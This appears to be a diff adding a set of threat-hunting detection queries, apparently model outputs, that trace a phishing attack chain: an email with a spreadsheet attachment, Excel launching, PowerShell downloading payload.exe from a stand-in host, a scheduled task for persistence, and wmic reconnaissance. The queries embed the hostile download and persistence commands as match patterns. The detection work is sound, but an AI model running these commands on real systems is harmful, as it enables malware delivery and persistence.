@@ -1,0 +1,18 @@
+<output>
+subject: "*Important Update*" AND attachment: "Update_2023.xlsx"
+</output>
+<output>
+Image: "C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\OfficeXX\\\\EXCEL.EXE" AND CommandLine: "*Update_2023.xlsx*"
+</output>
+<output>
+Image: "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe" AND CommandLine: "*Invoke-WebRequest -Uri 'http://malicious-server.com/payload.exe'*"
+</output>
+<output>
+Image: "*malicious_payload.exe*"
+</output>
+<output>
+CommandLine: "*schtasks /create /tn \\"MaliciousTask\\" /tr \\"C:\\\\\\\\Users\\\\\\\\Victim\\\\\\\\Downloads\\\\\\\\malicious_payload.exe\\"*"
+</output>
+<output>
+CommandLine: "*wmic /node:\\"target-machine\\" product get name,version*"
+</output>
